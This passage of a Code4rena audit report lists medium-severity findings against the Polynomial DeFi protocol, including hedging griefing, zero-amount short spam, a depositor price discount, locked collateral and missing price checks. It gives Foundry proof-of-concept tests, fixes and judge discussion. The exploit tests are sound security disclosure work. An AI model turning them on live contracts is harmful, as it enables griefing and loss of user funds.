**[rivalq (Polynomial) confirmed and commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/120#issuecomment-1548111940):**
 > Yeah this scenario can happen but only after many what-ifs.

**[Dravee (judge) marked as valid](https://github.com/code-423n4/2023-03-polynomial-findings/issues/120#issuecomment-1548731632)**



***

## [[M-12] Attacker can post-running attack to prevent `LiquidityPool` from hedging by orders of PerpMarket](https://github.com/code-423n4/2023-03-polynomial-findings/issues/114)
*Submitted by [KIntern\_NA](https://github.com/code-423n4/2023-03-polynomial-findings/issues/114)*

The attacker can post-running attack to keep the `LiquidityPool's` can't submit the orders of perpetual for hedging. It leads to every trade of the pool will not be hedged anymore.

### Proof of concept

1.  `LiquidityPool` calls function `_hedge` every trade, and it triggers function `_placeDelayedOrder`.

```solidity
function _placeDelayedOrder(int256 sizeDelta, bool isLiquidation) internal {
    IPerpsV2MarketBaseTypes.DelayedOrder memory order = perpMarket.delayedOrders(address(this));

    (,,,,, IPerpsV2MarketBaseTypes.Status status) =
        perpMarket.postTradeDetails(sizeDelta, 0, IPerpsV2MarketBaseTypes.OrderType.Delayed, address(this));

    int256 oldSize = order.sizeDelta;
    if (oldSize != 0 || isLiquidation || uint8(status) != 0) {
        queuedPerpSize += sizeDelta;
        return;
    }
    perpMarket.submitOffchainDelayedOrderWithTracking(sizeDelta, perpPriceImpactDelta, synthetixTrackingCode);

    emit SubmitDelayedOrder(sizeDelta);
}
```

2.  In this function, if `(oldSize != 0 || isLiquidation || uint8(status) != 0)`, the pool will accumulate the variable `queuedPerpSize` and return. Else, the pool will submit a delay order of `sizeDelta` (the current size delta of the trade) to the Synthetix perpetual market.
3.  The current delay order of Pool will be executed by function `executePerpOrders` (`LiquidityPool.sol#L704`). After that, the order size of the pool will return to 0 and the pool can submit the other delayed order.
4.  However, when the pool can submit a new order, function `_placeDelayedOrder` just submit the order with `sizeDelta` of the current trade. And the order of `queuedPerpSize` can only submitted in function `placeQueuedOrder` (`LiquidityPool.sol#L692`), but it require the current order size of pool is 0:

```solidity
function placeQueuedOrder() external requiresAuth nonReentrant {
    IPerpsV2MarketBaseTypes.DelayedOrder memory order = perpMarket.delayedOrders(address(this));

    require(order.sizeDelta == 0);
```

5.  Therefore, after the `executePerpOrders` call from the authority, attacker can post-run opening/closing a position, to trigger function `_placeDelayedOrder`, and make the pool submit the order of the current `sizeDelta`. Then the order size of the pool will be different from 0, and the pool can't submit other delay orders, until the next `executePerpOrders` call. And all the sizes of trades after that will be accumulated into `queuedPerpSize`.
6.  Attacker can repeat post-running function `executePerpOrders` with a small trade, to keep the pool can't submit the necessary order (with `queuedPerpSize`) for hedging. Then every trade will not be hedged.

### Recommended Mitigation Steps

Function `_placeDelayedOrder` should submit the order of `queuedPerpSize + sizeDelta` instead of `sizeDelta`. You can take a look at the following example:

```solidity
function _placeDelayedOrder(int256 sizeDelta, bool isLiquidation) internal {
    IPerpsV2MarketBaseTypes.DelayedOrder memory order = perpMarket.delayedOrders(address(this));

    (,,,,, IPerpsV2MarketBaseTypes.Status status) =
        perpMarket.postTradeDetails(queuedPerpSize + sizeDelta, 0, IPerpsV2MarketBaseTypes.OrderType.Delayed, address(this));

    int256 oldSize = order.sizeDelta;
    if (oldSize != 0 || isLiquidation || uint8(status) != 0) {
        queuedPerpSize += sizeDelta;
        return;
    }
    perpMarket.submitOffchainDelayedOrderWithTracking(queuedPerpSize + sizeDelta, perpPriceImpactDelta, synthetixTrackingCode);

    emit SubmitDelayedOrder(sizeDelta);
}
```

**[mubaris (Polynomial) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/114#issuecomment-1495943721):**
 > There's a function to manually hedge the pool if it is not `hedgePositions()`, but I acknowledge the issue but disagree with the severity of this.

**[Dravee (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/114#issuecomment-1532123771):**
 > Griefing attack that has a counter. I believe Medium to be right.



***

## [[M-13] Attacker can transfer all SUSD’s balance of LiquidityPool as margin to Synthetix perpetual market, and break the actions of users until the pool is rebalanced by the authority](https://github.com/code-423n4/2023-03-polynomial-findings/issues/112)
*Submitted by [KIntern\_NA](https://github.com/code-423n4/2023-03-polynomial-findings/issues/112)*

Contract `LiquidityPool` will transfer margin of size delta for every trade, and this margin is always > 0. Then attacker can repeat open and close a position in 1 transaction, to make the pool transfer all its SUSD tokens to Synthetix perpetual market as margin, even the perpetual size of `LiquidityPool` will not change after that. Then many actions of users which need SUSD of the pool such as withdrawing liquidity tokens, opening short positions, closing long positions... can't be executed until the pool is rebalanced by the authority.

### Proof of concept

Let's take a look at function `_hedge` in contract `LiquidityPool`:

```solidity
function _hedge(int256 size, bool isLiquidation) internal returns (uint256 hedgingFees) {
    ...
    uint256 marginRequired = _calculateMargin(hedgingSize) + hedgingFees;
    usedFunds += int256(marginRequired);
    require(usedFunds <= 0 || totalFunds >= uint256(usedFunds));

    perpMarket.transferMargin(int256(marginRequired));
    ...
```

In this function, `marginRequired` is always > 0, since it is the required margin for the independant `hedgingSize`.

Even the size of pool's perpetual position increases or decreases (sometimes it doesn't need to transfer more positive margin), it always transfer this amount of SUSD as margin to Synthetix perpetual market.

Then attacker can make the pool transfer all its SUSD tokens as margin by repeating open and close a position, although it will not change the pool's perpetual size after that. It leads to users' actions can be broken because of the lack of SUSD in LiquidityPool, until the pool is rebalanced by the authority. Furthermore, the attacker can front-run to break the actions of important specific users.

### Recommended Mitigation Steps

Calculate `marginRequired` (can be positive or negative) from the new perpetual size  and the remaining margin. I advise you to use the similar calculation from the function `rebalanceMargin`.

**[mubaris (Polynomial) disagreed with severity and commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/112#issuecomment-1495952003):**
 > The entire action of the pool will be watched by a keeper bot to call `rebalanceMargin()` anytime required. I disagree with the severity of this issue.

**[Dravee (judge) decreased severity to Low/Non-Critical and commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/112#issuecomment-1500901346):**
 > > *Furthermore, the attacker can front-run to break the actions of important specific users.*
> 
> Optimism, no front-running. 
> 
> Assets aren't at risk and this can't really be considered a real grief attack either if this is just a random act. 
> 
> Lack of coded POC too to prove that this could actually be done for cheap or not by the attacker. Hand-waved arguments.
> 
> Will downgrade to QA.

**[duc (warden) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/112#issuecomment-1536546711):**
 > This issue highlights the problem that the LiquidityPool contract always adds margin for every trade, even if sizeDelta is decreased. The marginRequired should be calculated correctly, similar to the rebalanceMargin function, to prevent the transferred margin from growing too high.
 > 
> Therefore, the attacker can conduct a grief attack by repeatedly opening and closing a position in 1 transaction, causing the LiquidityPool to transfer more margin than it actually needs. I am aware that a keeper bot will be used to call rebalanceMargin() whenever necessary, but bot's action can't guarantee flawless performance indefinitely. So within the scope of the smart contract, I think this issue deserves to be considered a valid medium.

**[Dravee (judge) increased severity to Medium and commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/112#issuecomment-1540459576):**
 > Talked with the sponsor.<br>
> This issue can indeed be considered valid, but will be a no-fix.<br>
> Still a nice-to-have on the final report.



***

## [[M-14] Possible spamming attack in opening or closing Long or Short Positions in `Exchange.openTrade`](https://github.com/code-423n4/2023-03-polynomial-findings/issues/79)
*Submitted by [PaludoX0](https://github.com/code-423n4/2023-03-polynomial-findings/issues/79), also found by [Bauer](https://github.com/code-423n4/2023-03-polynomial-findings/issues/53)*


One user that wants to open a short position shall not have a long position already opened and viceversa.

This is the check for opening a long position:

        if (params.isLong) {
            uint256 shortPositions = shortToken.balanceOf(msg.sender);
            require(shortPositions == 0, "Short position must be closed before opening");

This is the check for opening a short position:

        } else {
            uint256 holdings = powerPerp.balanceOf(msg.sender);
            require(holdings == 0, "Long position must be closed before opening");

The issue is that anyone can open a short position with value 0 without binding any collateral and then spamming the short token to user that would like to open a position.
Neither in `Exchange._openTrade` or `ShortToken.sol.adjustPosition` there's a check the amount of short shall be > 0

### Proof of Concept

Copy and paste the following POC in `test/Exchange.Simple.t.sol`

    function testMultipleShortOpen0AmountandSpam() public {
    //Open a short position for user_1 with 0 shortAmount and 0 collateral
        for (uint256 i = 0; i < 1000; i++) {
            (uint256 positionId, Exchange.TradeParams memory tradeParams) = openShort(0, 0, user_1);
            (uint256 _positionId, uint256 _shortAmount, uint256 _collateralAmount, ) = shortToken.shortPositions(positionId);

        //(, uint256 _collateralAmount) = shortCollateral.userCollaterals(positionId);
            assertEq(_shortAmount, 0);
            assertEq(positionId, i);
            assertEq(shortToken.balanceOf(user_1), i);
            assertEq(_collateralAmount, 0);
        }

    //Open Long for user_1 and it will revert because it has at least one short opened
        susd.mint(user_1, 1000e18);
        Exchange.TradeParams memory tradeParamsL;
        tradeParamsL.isLong = true;
        tradeParamsL.amount = 1e18;
        tradeParamsL.maxCost = 1000e18;
    vm.startPrank(user_1);
        susd.approve(address(getPool()), 1000e18);

    vm.expectRevert();
        exchange.openTrade(tradeParamsL);

    //Perp balance of user_1 is 0       
    assertEq(powerPerp.balanceOf(user_1), 0);

    //user_1 transfers a shortToken to user_2
        uint256 positionId =55;
        shortToken.safeTransferFrom(user_1, user_2, positionId);
    vm.stopPrank();  //end of domain of user_1
        
    //Open Long for user_2 it will revert because it has a short opened

        susd.mint(user_2, 1000e18);
        tradeParamsL.isLong = true;
        tradeParamsL.amount = 2e18;
        tradeParamsL.maxCost = 1000e18;
        vm.startPrank(user_2);
        susd.approve(address(getPool()), 1000e18);
    vm.expectRevert();
        exchange.openTrade(tradeParamsL);
    vm.stopPrank();
    assertEq(powerPerp.balanceOf(user_2),0);
    }

### Tools Used

Manual review and foundry forge

### Recommended Mitigation Steps

It's suggested to set a sensible minimum amount of tokens to be withdrawn or at least to be greater than 0.

**[Dravee (judge) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/79#issuecomment-1480564252):**
 > The POC fails, but can be corrected with the following:
> ```diff
> -    for (uint256 i = 0; i < 1000; i++) {
> +    for (uint256 i = 1; i < 1000; i++) {
> ```

**[Dravee (judge) decreased severity to Medium](https://github.com/code-423n4/2023-03-polynomial-findings/issues/79#issuecomment-1499801279)**

**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/79#issuecomment-1532594567)**



***

## [[M-15] First Depositors will incurr a rebalancing Loss](https://github.com/code-423n4/2023-03-polynomial-findings/issues/75)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-03-polynomial-findings/issues/75)*

```solidity
    function getTokenPrice() public view returns (uint256) {
        if (totalFunds == 0) {
            return 1e18;
        }

        uint256 totalSupply = getTotalSupply();
        if (positionData.positionId == 0) {
            return totalFunds.divWadDown(totalSupply);
        }

```

After a deposit, the funds are invested, doing so incurs a fee, which causes `getTokenPrice` to reduce, this offers a discount to later depositors.

Because the fee impacts the token price, future depositors will be able to purchase the Vault token at a discount.

This gives them an advantage as they'll be receiving yield without incurring the additional cost.

### Coded POC

The following POC is built by creating a new test file `TestRebaseAttack.t.t.sol`

The salient output from the test is the following

```javascript
    ├─ emit Debug(name: tokenPrice, value: 1000000000000000000)
    ├─ emit Debug(name: newTokenPrice, value: 998684000000000000)
```

Which means that after creating the position to be delta neutral, due to fees being paid, the price of the token is lower, meaning it's cheaper to deposit after `openPosition` instead of before.

Below the full code for you to verify:

Can be run with
`forge test --match-test testOpenRebaseAttack -vvvvv`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import {console2} from "forge-std/console2.sol";

import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
import {Exchange} from "../src/Exchange.sol";
import {TestSystem} from "./utils/TestSystem.sol";
import {KangarooVault} from "../src/KangarooVault.sol";
import {MockERC20Fail} from "../src/test-helpers/MockERC20Fail.sol";
import {LiquidityPool} from "../src/LiquidityPool.sol";
import {IPerpsV2MarketBaseTypes} from "../src/interfaces/synthetix/IPerpsV2MarketBaseTypes.sol";

contract TestRebaseAttack is TestSystem {
    using FixedPointMathLib for uint256;

    uint256 public constant initialPrice = 1200e18;

    Exchange private exchange;
    MockERC20Fail private susd;
    KangarooVault private kangaroo;
    LiquidityPool private pool;

    uint256 private leverage;
    uint256 private collRatio;

    bytes[] private emptyData;

    function setUp() public {
        deployTestSystem();
        initPool();
        initExchange();
        preparePool();
        setAssetPrice(initialPrice);
        initKangaroo();

        exchange = getExchange();
        susd = getSUSD();
        kangaroo = getKangaroo();
        pool = getPool();

        susd.mint(user_1, 5e23);

        vm.startPrank(user_1);
        susd.approve(address(kangaroo), 5e23);
        kangaroo.initiateDeposit(user_1, 1e23);
        vm.stopPrank();

        leverage = kangaroo.leverage();
        collRatio = kangaroo.collRatio();
    }


    event Debug(string name, uint256 value);

    function testOpenRebaseAttack() public {
        uint256 tokenPrice = kangaroo.getTokenPrice();
        assertEq(tokenPrice, 1e18, "!1e18");

        kangaroo.openPosition(1e19, 0);

        uint256 newTokenPrice = kangaroo.getTokenPrice();

        vm.startPrank(user_1);
        kangaroo.initiateDeposit(user_1, 1e18);
        vm.stopPrank();
        
        emit Debug("tokenPrice", tokenPrice);
        emit Debug("newTokenPrice", newTokenPrice);

        assertTrue(tokenPrice != newTokenPrice, "No change");
    }
}
```

### Recommended Mitigation

It may be best to have a deposit or withdrawal fee that evens out the hedging costs as not to discourage early depositors.

**[mubaris (Polynomial) disputed and commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/75#issuecomment-1497130190):**
 > Token price is meant to go down after you open a position, that's how it's supposed to work.

**[Dravee (judge) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/75#issuecomment-1499872328):**
 > > *Token price is meant to go down after you open a position, that's how it's supposed to work.*
> 
> Very hard to argue with such an argument. If the warden can think of some counter-arguments in Post-Judging QA, I'll be open to hear them.

**[GalloDaSballo (warden) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/75#issuecomment-1533360309):**
 > Thank you for the opportunity to add more info. I believe the initial submission shows that the price for consecutive depositors is cheaper. For example if we let a big deposit happen, then we will get more tokens for less cost.
> 
> The updated tests simply has a second depositor instead of checking the price, you can see that if I deposit as the second person I get 5 times more tokens.
> ```solidity
> function testOpenRebaseAttack() public {
>         uint256 tokenPrice = kangaroo.getTokenPrice();
>         assertEq(tokenPrice, 1e18, "!1e18");
> 
>         kangaroo.openPosition(1e19, 0);
> 
>         uint256 newTokenPrice = kangaroo.getTokenPrice();
> 
>         vm.startPrank(user_2);
>         kangaroo.initiateDeposit(user_2, 5e23);
>         vm.stopPrank();
> 
>         kangaroo.processDepositQueue(1);
> 
> 
>         emit Debug("tokenPrice", tokenPrice);
>         emit Debug("newTokenPrice", newTokenPrice);
>         emit Debug("VAULT_TOKEN.balanceOf(user_2)", VAULT_TOKEN.balanceOf(user_2));
>         emit Debug("VAULT_TOKEN.balanceOf(user_1))", VAULT_TOKEN.balanceOf(user_1));
> 
>         assertTrue(tokenPrice != newTokenPrice, "No change");
>         assertTrue(VAULT_TOKEN.balanceOf(user_2) > VAULT_TOKEN.balanceOf(user_1));
>     }
> ```
> 
> Log shows that I get 5e23 tokens vs 1e23
> 
> ```solidity
>     ├─ emit Debug(name: tokenPrice, value: 1000000000000000000)
>     ├─ emit Debug(name: newTokenPrice, value: 998684000000000000)
>     ├─ [542] VaultToken::balanceOf(0x53E2Cd188FE5E37D9bA9D267828B6be3975801D5) [staticcall]
>     │   └─ ← 500658867069062886758974
>     ├─ emit Debug(name: VAULT_TOKEN.balanceOf(user_2), value: 500658867069062886758974)
>     ├─ [2542] VaultToken::balanceOf(0xe5ecc448cf264e5AB26D08C16e33263eF9E91676) [staticcall]
>     │   └─ ← 100000000000000000000000
>     ├─ emit Debug(name: VAULT_TOKEN.balanceOf(user_1)), value: 100000000000000000000000)
>     ├─ [542] VaultToken::balanceOf(0xe5ecc448cf264e5AB26D08C16e33263eF9E91676) [staticcall]
>     │   └─ ← 100000000000000000000000
>     ├─ [542] VaultToken::balanceOf(0x53E2Cd188FE5E37D9bA9D267828B6be3975801D5) [staticcall]
>     │   └─ ← 500658867069062886758974
>     └─ ← ()
> ```

**[mubaris (Polynomial) acknowledged and commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/75#issuecomment-1534104903):**
 > What you're saying is true, but token price reflects the price of each token against the total asset held by the vault. Once you pay fee for an action like trading, that fee is lost forever from the vault. If we start accounting that (some value that doesn't exist), we'll run in to accounting errors down the line. So it doesn't make sense to add the fees paid by the vault in value held by the vault.
> 
> It is also true that, the second user gets much more tokens than the first user. But any funds added to the vault gets used for opening a new position and the user has stay in the vault until the new position becomes profitable to be profitable. There's no immediate exit process here. We use the same mechanism for our options vaults which has been live for a while now.



***

## [[M-16] Supply drain of PowerPerp tokens through liquidations](https://github.com/code-423n4/2023-03-polynomial-findings/issues/69)
*Submitted by [RaymondFam](https://github.com/code-423n4/2023-03-polynomial-findings/issues/69)*

Contract `PowerPerp` that has Solmate's ERC20.sol inherited has zero `totalSupply` initiated by default. And, as denoted by PowerPerp.sol, `onlyExchange` can mint or burn Power (Square) Perp ERC-20 tokens:

File: `PowerPerp.sol#L32-L38`

```solidity
    function mint(address _user, uint256 _amt) public onlyExchange {
        _mint(_user, _amt);
    }

    function burn(address _user, uint256 _amt) public onlyExchange {
        _burn(_user, _amt);
    }
```

This could run into supply issue if the source and drain have not been routed through the right channels.

### Proof of Concept

There is only one source of minting when users open long trades (`Exchange.sol#L233-L245`).

However, there are two channels users could burn the tokens, i.e. closing long trades (`Exchange.sol#L288-L299`), and liquidating positions (`Exchange.sol#L333-L353`).

It is apparent that the long traders hold the majority of the tokens although long term the tokens can be swapped for `SUSD` on the swap exchange, believing that is how `MarkPrice` derives from. Additionally, this should be where liquidators who are neither long nor short traders buy their Power Perp tokens from prior to profiting on the liquidable positions.

If liquidations get more frequent than expected due to collateral token dropping in price, `powerPerp.burn()` (`Exchange.sol#L350`) is going to both strain the Power Perp token supply and drive up the price. As a result, the amount of positions going underwater is going to increase too.

The chain effect continues since long traders will have difficulty closing their positions if their minted Power Perp tokens have earlier been swapped for `SUSD` at lower prices than now.

The situation could be worse if the scenario described above were to happen in the early phase of system launch.

### Recommended Mitigation Steps

Since short traders are sent the cost deducted `SUSD` when opening their positions, consider having liquidators sending in the equivalent amount of cost added `SUSD` to the liquidity pool (just like when short traders are closing their positions) instead of having Power Perp tokens burned in `_liquidate()`. This will also have a good side effect of enhancing the hedging capability of the liquidity pool.

**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/69#issuecomment-1510104313)**



***

## [[M-17] Users' collateral could get stuck permanently after fully closing short trades](https://github.com/code-423n4/2023-03-polynomial-findings/issues/67)
*Submitted by [RaymondFam](https://github.com/code-423n4/2023-03-polynomial-findings/issues/67)*

When completely closing a short trade, a user is supposed to input `TradeParams` such that:

`shortPosition.shortAmount == params.shortAmount`<br>
`shortPosition.collateralAmount == params.collateralAmount`

However, if cares have not been given particularly when inputting `params.collateralAmount` via a non-frontend method such as <https://optimistic.etherscan.io/>, a zero or a value smaller than `shortPosition.collateralAmount` could be accidentally entered. After the transaction has succeeded, the user's collateral would be permanently locked in contract `ShortCollateral`.

### Proof of Concept

As can be seen from the code block pertaining to `_closeTrade()` below, `totalShortAmount == 0` will make the require statement pass easily because `minCollateral == 0` (`ShortCollateral.sol#L169-L170`).

File: `Exchange.sol#L310-L319`

```solidity
            uint256 totalShortAmount = shortPosition.shortAmount - params.amount;
            uint256 totalCollateralAmount = shortPosition.collateralAmount - params.collateralAmount;

            uint256 minCollateral = shortCollateral.getMinCollateral(totalShortAmount, params.collateral);
            require(totalCollateralAmount >= minCollateral, "Not enough collateral");

            shortCollateral.sendCollateral(params.positionId, params.collateralAmount);
            shortToken.adjustPosition(
                params.positionId, msg.sender, params.collateral, totalShortAmount, totalCollateralAmount
            );
```

The inadequate `params.collateralAmount` accidentally inputted is then sent to the user:

File: `ShortCollateral.sol#L106-L116`

```solidity
    function sendCollateral(uint256 positionId, uint256 amount) external override onlyExchange nonReentrant {
        UserCollateral storage userCollateral = userCollaterals[positionId];

        userCollateral.amount -= amount;

        address user = shortToken.ownerOf(positionId);

        ERC20(userCollateral.collateral).safeTransfer(user, amount);

        emit SendCollateral(positionId, userCollateral.collateral, amount);
    }
```

Next, the user's position is adjusted such that its position is burned because of a complete position close. Note that `position.shortAmount` is assigned `0` whereas `position.collateralAmount` is assigned a non-zero value.

File: `ShortToken.sol#L79-L84`

```solidity
            position.collateralAmount = collateralAmount;
            position.shortAmount = shortAmount;

            if (position.shortAmount == 0) {
                _burn(positionId);
            }
```

Because the user's ERC-721 short token is now burned, removing the forgotten/remaining collateral from the short position is going to revert on the ownership check:

File: `Exchange.sol#L388`

```solidity
        require(shortToken.ownerOf(positionId) == msg.sender);
```

### Recommended Mitigation Steps

Consider adding a check in `_closeTrade()` that will fully send the collateral to the user when the position is intended to be fully closed as follows:

File: `Exchange.sol#L310-L316`

```diff
            uint256 totalShortAmount = shortPosition.shortAmount - params.amount;
            uint256 totalCollateralAmount = shortPosition.collateralAmount - params.collateralAmount;

            uint256 minCollateral = shortCollateral.getMinCollateral(totalShortAmount, params.collateral);
            require(totalCollateralAmount >= minCollateral, "Not enough collateral");

+            if (totalShortAmount == 0) {
+                params.collateralAmount = shortPosition.collateralAmount;
+            }
            shortCollateral.sendCollateral(params.positionId, params.collateralAmount);
```

**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/67#issuecomment-1497076582)**



***

## [[M-18] Lack of price validity check from Synthetix results in loss of funds while liquidating](https://github.com/code-423n4/2023-03-polynomial-findings/issues/59)
*Submitted by [DadeKuma](https://github.com/code-423n4/2023-03-polynomial-findings/issues/59), also found by [rbserver](https://github.com/code-423n4/2023-03-polynomial-findings/issues/217) and [\_\_141345\_\_](https://github.com/code-423n4/2023-03-polynomial-findings/issues/170)*

Lack of a validity check while liquidating results in loss of funds, as the price could be invalid momentarily from Synthetix due to high volatility or other issues.

### Proof of Concept

There isn't a check for `isInvalid` in `getMarkPrice` and `getAssetPrice`, which must be false before closing the liquidation:

```solidity
File: src/ShortCollateral.sol

134:         (uint256 markPrice,) = exchange.getMarkPrice();
135:         (uint256 collateralPrice,) = synthetixAdapter.getAssetPrice(currencyKey);

```

This check is used in other similar functions that fetch the price:

    File: src/ShortCollateral.sol

    194:         (uint256 markPrice, bool isInvalid) = exchange.getMarkPrice();
    195:         require(!isInvalid);

    205:         (collateralPrice, isInvalid) = synthetixAdapter.getAssetPrice(collateralKey);
    206:         require(!isInvalid);

This must be present to ensure that the price fetched from Synthetix is not stale or invalid.

If this isn't the case, a liquidation could result in under-liquidation (a loss for the user) or over-liquidation (a loss for the protocol).

The same problem is also present in `LiquidityPool`:

```solidity
File: src/LiquidityPool.sol

388:         (uint256 markPrice,) = exchange.getMarkPrice();
```

As the `markPrice` is not validated when calculating the `orderFee`.

### Recommended Mitigation Steps

Add a check to be sure that `isInvalid` is false in both `markPrice` and `collateralPrice` before liquidating.

**[rivalq (Polynomial) disagreed with severity](https://github.com/code-423n4/2023-03-polynomial-findings/issues/59#issuecomment-1495749537)**

**[Dravee (judge) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/59#issuecomment-1517792823):**
 > Would like @rivalq 's thought on the severity and validity.<br>
> Was there a reason for an absence on these checks? (Like a redundancy because it would revert somewhere on an invalid price).
> 
> It was also raised by the warden that an invalid price could be 0 through these:
> - `PerpsV2MarketViews.sol#L45-L50`
> - `PerpsV2Market.sol#L124-L126`
> 
> How likely is this to happen?

**[mubaris (Polynomial) confirmed and commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/59#issuecomment-1518535573):**
 > This seems like a miss from our side.

**[Dravee (judge) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/59#issuecomment-1521468233):**
 > Agreed on Medium severity.



***

## [[M-19] Collateral removal not possible](https://github.com/code-423n4/2023-03-polynomial-findings/issues/16)
*Submitted by [csanuragjain](https://github.com/code-423n4/2023-03-polynomial-findings/issues/16), also found by [DadeKuma](https://github.com/code-423n4/2023-03-polynomial-findings/issues/248), [rbserver](https://github.com/code-423n4/2023-03-polynomial-findings/issues/223), [bytes032](https://github.com/code-423n4/2023-03-polynomial-findings/issues/128), and [KIntern\_NA](https://github.com/code-423n4/2023-03-polynomial-findings/issues/118)*

If an approved collateral has later started say taking fees on transfer then protocol has no way to remove such collateral. The current deposit logic cannot handle fee on transfer token and would give more funds to user then actually obtained by contract

### Proof of Concept

1.  Assume protocol was supporting collateral X (say USDT which has fee currently set as 0)
2.  After some time collateral introduces fee on transfer
3.  Protocol does not have a way to remove a whitelisted collateral
4.  Problem begins once user starts depositing such collateral

```
    function _addCollateral(uint256 positionId, uint256 amount) internal {
    ...
    ERC20(shortPosition.collateral).safeTransferFrom(msg.sender, address(this), amount);
            ERC20(shortPosition.collateral).safeApprove(address(shortCollateral), amount);

            shortToken.adjustPosition(
                positionId,
                msg.sender,
                shortPosition.collateral,
                shortPosition.shortAmount,
                shortPosition.collateralAmount + amount
            );
            shortCollateral.collectCollateral(shortPosition.collateral, positionId, amount);
    ...
    }
```

5.  In this case `amount` is transferred from user to contract but contract will only receive `amount-fees`. But contract will still adjust position with full `amount` instead of `amount-fees` which is incorrect.

### Recommended Mitigation Steps

Add a way to disapprove collateral so that if in future some policy changes for a particular collateral, protocol can stop supporting it. This will it would only have to deal with existing collateral which can be wiped out slowly using public announcement.

**[Dravee (judge) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/16#issuecomment-1478987449):**
 > Not a duplicate of https://github.com/code-423n4/2023-03-polynomial-findings/issues/178 as Fee-on-transfer tokens are only mentioned as a scenario that may make the protocol want to disapprove a collateral.
> 
> Due to a real lack of way to disapprove a collateral, I believe this finding is valid.

**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/16#issuecomment-1497061603)**



***

# Low Risk and Non-Critical Issues

For this audit, 14 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2023-03-polynomial-findings/issues/99) by **rbserver** received the top score from the judge.

*The following wardens also submitted reports: [auditor0517](https://github.com/code-423n4/2023-03-polynomial-findings/issues/229), [adriro](https://github.com/code-423n4/2023-03-polynomial-findings/issues/211), [joestakey](https://github.com/code-423n4/2023-03-polynomial-findings/issues/186), [btk](https://github.com/code-423n4/2023-03-polynomial-findings/issues/179), [bin2chen](https://github.com/code-423n4/2023-03-polynomial-findings/issues/148), [juancito](https://github.com/code-423n4/2023-03-polynomial-findings/issues/88), [RaymondFam](https://github.com/code-423n4/2023-03-polynomial-findings/issues/87), [PaludoX0](https://github.com/code-423n4/2023-03-polynomial-findings/issues/84), [DadeKuma](https://github.com/code-423n4/2023-03-polynomial-findings/issues/83), [0xSmartContract](https://github.com/code-423n4/2023-03-polynomial-findings/issues/82), [GalloDaSballo](https://github.com/code-423n4/2023-03-polynomial-findings/issues/74), [Sathish9098](https://github.com/code-423n4/2023-03-polynomial-findings/issues/40), and [Rolezn](https://github.com/code-423n4/2023-03-polynomial-findings/issues/3).*

## Summary

| |Issue|
|-|:-|
| \[01] | LACK OF LIMITS FOR SETTING FEES |
| [02] | SOME FUNCTIONS DO NOT FOLLOW CHECKS-EFFECTS-INTERACTIONS PATTERN |
| [03] | `nonReentrant` MODIFIER CAN BE PLACED AND EXECUTED BEFORE OTHER MODIFIERS IN FUNCTIONS |
| [04] | REDUNDANT `return` KEYWORDS IN `ShortToken.transferFrom` and `ShortToken.safeTransferFrom` FUNCTIONS |
| [05] | CONSTANTS CAN BE USED INSTEAD OF MAGIC NUMBERS |
| [06] | HARDCODED STRING THAT IS REPEATEDLY USED CAN BE REPLACED WITH A CONSTANT |
| [07] | `ShortToken.adjustPosition` FUNCTION DOES NOT NEED TO UPDATE `totalShorts` and `position.shortAmount` IN CERTAIN CASE |
| [08] | `LiquidityPool.withdraw` FUNCTION CALLS BOTH `SUSD.safeTransfer` AND `SUSD.transfer` |
| [09] | `LiquidityPool.orderFee` FUNCTION CAN CALL `getMarkPrice()` INSTEAD OF `exchange.getMarkPrice()` |
| [10] | IMMUTABLES CAN BE NAMED USING SAME CONVENTION |
| [11] | UNUSED IMPORT |
| [12] | FLOATING PRAGMAS |
| [13] | SOLIDITY VERSION `0.8.19` CAN BE USED |
| [14] | ORDERS OF LAYOUT DO NOT FOLLOW OFFICIAL STYLE GUIDE |
| [15] | INCOMPLETE NATSPEC COMMENTS |
| [16] | MISSING NATSPEC COMMENTS |

## [01] LACK OF LIMITS FOR SETTING FEES
When calling the following `LiquidityPool.setFees` function, there are no limits for setting `depositFee` and `withdrawalFee`. If these fees are set to 1e18, calling the `LiquidityPool.deposit` function can cause all of the `amount` to become the deposit fees and zero liquidity tokens to be minted to the user, and calling the `LiquidityPool.withdraw` function can cause all of the `susdToReturn` to become the withdrawal fees and zero `SUSD` tokens to be transferred to the user. If these fees are set to be more than 1e18, calling the `LiquidityPool.deposit` function can revert because `amount - fees` underflows, and calling the `LiquidityPool.withdraw` function can also revert because `susdToReturn - fees` underflows.

```solidity
    function setFees(uint256 _depositFee, uint256 _withdrawalFee) external requiresAuth {
        emit UpdateFees(depositFee, _depositFee, withdrawalFee, _withdrawalFee);
        depositFee = _depositFee;
        withdrawalFee = _withdrawalFee;
    }
```

```solidity
    function deposit(uint256 amount, address user) external override nonReentrant whenNotPaused("POOL_DEPOSIT") {
        uint256 tokenPrice = getTokenPrice();
        uint256 fees = amount.mulWadDown(depositFee);
        uint256 amountForTokens = amount - fees;
        uint256 tokensToMint = amountForTokens.divWadDown(tokenPrice);
        liquidityToken.mint(user, tokensToMint);
        totalFunds += amountForTokens;
        SUSD.safeTransferFrom(msg.sender, feeReceipient, fees);
